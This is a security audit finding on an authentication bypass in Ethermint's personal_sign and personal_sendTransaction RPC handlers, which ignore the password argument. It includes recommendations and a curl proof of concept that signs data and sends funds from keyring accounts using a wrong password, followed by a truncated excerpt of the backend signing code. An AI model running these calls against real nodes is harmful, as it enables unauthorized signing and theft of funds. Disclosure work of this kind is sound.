### Title
Password Parameter Silently Discarded in `personal_sign` and `personal_sendTransaction`, Enabling Unauthorized Signing and Fund Transfer - (File: `rpc/namespaces/ethereum/personal/api.go`)

### Summary

The `personal_sign` and `personal_sendTransaction` JSON-RPC handlers in Ethermint accept a `password` parameter that is supposed to authenticate the caller before using the node's private key, but both implementations silently discard the password entirely (using the blank identifier `_`). Any caller with access to the `personal_` JSON-RPC namespace can sign arbitrary data or submit transactions on behalf of any address held in the node's keyring without supplying the correct password. This is a direct authentication bypass on the node's key-management API.

### Finding Description

In `rpc/namespaces/ethereum/personal/api.go`, both sensitive signing methods receive the password argument but throw it away:

```go
// Line 131 – password is the third argument, discarded with _
func (api *PrivateAccountAPI) SendTransaction(_ context.Context, args evmtypes.TransactionArgs, _ string) (common.Hash, error) {
    api.logger.Debug("personal_sendTransaction", "address", args.To.String())
    return api.backend.SendTransaction(args)   // password never forwarded
}

// Line 145 – password is the fourth argument, discarded with _
func (api *PrivateAccountAPI) Sign(_ context.Context, data hexutil.Bytes, addr common.Address, _ string) (hexutil.Bytes, error) {
    api.logger.Debug("personal_sign", "data", data, "address", addr.String())
    return api.backend.Sign(addr, data)        // password never forwarded
}
```

The docstring for `Sign` explicitly states: *"The key used to calculate the signature is decrypted with the given password."* The docstring for `SendTransaction` states: *"If the given password isn't able to decrypt the key it fails."* Neither contract is honoured.

The backend `Sign` implementation (`rpc/backend/sign_tx.go` line 129–148) calls `b.clientCtx.Keyring.SignByAddress(from, …)` directly, with no password check. `SendTransaction` (`rpc/backend/sign_tx.go` line 38–126) similarly calls `msg.Sign(signer, b.clientCtx.Keyring)` with no password check.

The `personal_` namespace is registered and enabled in the node's JSON-RPC server (`rpc/apis.go` line 128–144) and is explicitly activated in the provided init scripts (`--json-rpc.api eth,txpool,personal,net,debug,web3`). When the node uses the `test` keyring backend (the default in all provided init scripts), no per-operation authentication exists at all, so the password bypass is total.

### Impact Explanation

An attacker with network access to the JSON-RPC port (or any client that can reach the `personal_` namespace) can:

1. Call `personal_sign` with any address held in the node's keyring and arbitrary payload bytes. The node signs the data with the account's private key and returns the signature — no password required. The resulting signature can be used to authorise EIP-712 typed-data operations, off-chain approvals, or any protocol that trusts `personal_sign` output.
2. Call `personal_sendTransaction` specifying any keyring address as `from`. The node signs and broadcasts a fully valid Ethereum transaction — no password required. This directly transfers EVM-denom funds out of the victim account.

Impact category: **High** — signer verification bypass enabling forged execution and unauthorized fund transfer from any account managed by the node.

### Likelihood Explanation

The `personal_` namespace is enabled by default in the provided init and test-node scripts. Nodes that expose their JSON-RPC port (common for RPC providers and dApp backends) are directly reachable. The `test` keyring backend, used in all provided scripts, requires no per-operation credential, making exploitation trivial: a single well-formed JSON-RPC call suffices. No privileged access, leaked keys, or chain-level attack is required.

### Recommendation

1. **Enforce the password parameter**: Before calling `backend.Sign` or `backend.SendTransaction`, use the supplied password to decrypt/verify the key from the keyring. If the keyring backend does not support per-call password verification, return an explicit error rather than silently proceeding.
2. **Deprecate or gate the `personal_` namespace**: Go-ethereum deprecated the `personal_` namespace for exactly this class of issue. Ethermint should either remove it or require explicit opt-in with a strong warning, and must not enable it in default or example configurations.
3. **Minimum fix**: Change the blank identifiers `_` to named variables and pass the password to the keyring's unlock/decrypt path before signing.

### Proof of Concept

With a running Ethermint node started with `--json-rpc.api eth,txpool,personal,net,debug,web3 --keyring-backend test`:

```bash
# Step 1: list accounts managed by the node
curl -X POST --data '{"jsonrpc":"2.0","method":"personal_listAccounts","params":[],"id":1}' \
  http://localhost:8545
# Returns: ["0xADDRESS_OF_KEYRING_ACCOUNT"]

# Step 2: sign arbitrary data with a WRONG password — succeeds anyway
curl -X POST --data '{
  "jsonrpc":"2.0","method":"personal_sign",
  "params":["0xdeadbeef","0xADDRESS_OF_KEYRING_ACCOUNT","WRONG_PASSWORD"],
  "id":2}' http://localhost:8545
# Returns a valid 65-byte ECDSA signature — password was never checked

# Step 3: send a transaction draining funds — no password needed
curl -X POST --data '{
  "jsonrpc":"2.0","method":"personal_sendTransaction",
  "params":[{"from":"0xADDRESS_OF_KEYRING_ACCOUNT","to":"0xATTACKER","value":"0x...","gas":"0x5208"},"WRONG_PASSWORD"],
  "id":3}' http://localhost:8545
# Returns a valid tx hash; funds transferred without correct password
```

func (b *Backend) SendTransaction(args evmtypes.TransactionArgs) (common.Hash, error) {
	// Look up the wallet containing the requested signer
	_, err := b.clientCtx.Keyring.KeyByAddress(sdk.AccAddress(args.GetFrom().Bytes()))
	if err != nil {
		b.logger.Error("failed to find key in keyring", "address", args.GetFrom(), "error", err.Error())
		return common.Hash{}, fmt.Errorf("failed to find key in the node's keyring; %s; %s", keystore.ErrNoMatch, err.Error())
	}

	if args.ChainID != nil && (b.chainID).Cmp((*big.Int)(args.ChainID)) != 0 {
		return common.Hash{}, fmt.Errorf("chainId does not match node's (have=%v, want=%v)", args.ChainID, (*hexutil.Big)(b.chainID))
	}

	args, err = b.SetTxDefaults(args)
	if err != nil {
		return common.Hash{}, err
	}

	msg := args.ToTransaction()
	if err := msg.ValidateBasic(); err != nil {
		b.logger.Debug("tx failed basic validation", "error", err.Error())
		return common.Hash{}, err
	}

	bn, err := b.BlockNumber()
	if err != nil {
		b.logger.Debug("failed to fetch latest block number", "error", err.Error())
		return common.Hash{}, err
	}

	header, err := b.CurrentHeader()
	if err != nil {
		b.logger.Debug("failed to fetch latest block header", "error", err.Error())
		return common.Hash{}, err
	}

	signer := ethtypes.MakeSigner(b.ChainConfig(), new(big.Int).SetUint64(uint64(bn)), header.Time)

	// Sign transaction
	if err := msg.Sign(signer, b.clientCtx.Keyring); err != nil {
		b.logger.Debug("failed to sign tx", "error", err.Error())
		return common.Hash{}, err
	}
